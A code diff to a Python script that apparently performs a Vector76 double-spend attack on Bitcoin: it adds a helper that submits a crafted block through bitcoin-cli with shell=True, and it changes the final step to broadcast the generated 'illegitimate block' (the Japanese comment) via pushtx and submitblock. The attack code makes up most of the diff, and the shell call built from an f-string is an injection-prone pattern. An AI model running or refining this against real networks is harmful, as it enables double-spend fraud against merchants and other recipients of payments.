@@ -46,6 +46,13 @@ def send_rawtransaction(hextx):
                              check=True)
     return result.stdout
 
+def submit_block(block):
+    subprocess.run(f'bitcoin-cli submitblock {block}',
+                             shell=True,
+                             capture_output=True,
+                             text=True,
+                             check=True)
+
 def broadcast_transaction(raw_tx, testnet):
 
     url = "https://live.blockcypher.com/btc/pushtx"
@@ -133,7 +140,7 @@ print()
 print()
 print(f"Generating Vector76 Block")
 #send_rawtransaction(vector76_block)
-result = generate_block(attacker_address, vector76_block)["hex"]
+generated_vector76_block = generate_block(attacker_address, vector76_block)["hex"]
 
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print()
@@ -151,7 +158,13 @@ time.sleep(1) #..... -u-
 
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
 print()
-transaction_util.pushtx(vector76_block)
+try:
+    transaction_util.pushtx(generated_vector76_block)
+except:
+    pass
+
+submit_block(generated_vector76_block)
+
 print()
 #おまけ
 print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
